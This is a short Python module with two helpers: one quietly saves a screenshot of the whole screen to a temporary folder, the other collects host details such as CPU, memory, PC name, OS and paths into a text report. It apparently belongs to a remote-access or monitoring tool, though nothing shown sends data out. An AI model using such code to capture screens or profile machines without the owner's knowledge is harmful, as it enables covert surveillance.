# -*- coding: utf-8 -*-
"""
Created on Fri Jul 13 23:44:50 2018

@author: toto
"""

import tempfile
import psutil 
import platform
import os 
import cpuinfo 
import sys

from PIL import ImageGrab


def screenshot():
    dirpath = tempfile.mkdtemp()
    path = dirpath+ "\\img.jpg"
    
    try :
        ImageGrab.grab().save(path, "JPEG")
        return path 
    except :
        return "[-] An Error occured while savind the file"
    

def infos():
        cpu_percent ="Cpu utlisation -> " + str(psutil.cpu_percent())+ "%"
        cpu_cores =  "Cpu Cores      -> " + str(psutil.cpu_count()) 
        cpu_freq =   "Cpu Frequency  -> " + str(psutil.cpu_freq()[0]/1000) + " Ghz "
        cpu_name =   "Cpu name       -> " + str(cpuinfo.cpu.info[0]["ProcessorNameString"])
        
        
        
        memory_count = "Memory ammount -> " + str(psutil.virtual_memory()[0]/(1024*1000000)) + " GB"
        memory_usage = "Memory Usage   -> " + str(psutil.virtual_memory()[2]) + " %"
        
        currentWorkingDir = "Current Dir    -> " + str(os.getcwd().replace("\\" ,"/"))
        
        osInfo = platform.uname()
        
        pcName = "Pc name         -> " + str(osInfo[1])
        
        osName = "Os Info         ->  " + str(osInfo[0]) + str(osInfo[2]) + "  " + str(osInfo[3]) + " <> " + str(osInfo[4])
        pythonVersion = "Python Version -> " +  str(sys.version) 
        
        pythonExecutableDir = "Exec path         -> " + str(os.path.realpath(os.path.dirname(sys.argv[0]))) 
        
        to_return = cpu_name + "\n"\
                + cpu_cores + "\n"\
                + cpu_freq + "\n"\
                + cpu_percent + "\n"\
                + "#############################" + "\n"\
                + memory_count + "\n"\
                + memory_usage + "\n"\
                + "#############################" + "\n"\
                + pcName + "\n"\
                + osName + "\n"\
                + pythonVersion + "\n"\
                + pythonExecutableDir + "\n"\
                + currentWorkingDir + "\n"\
                
        return to_return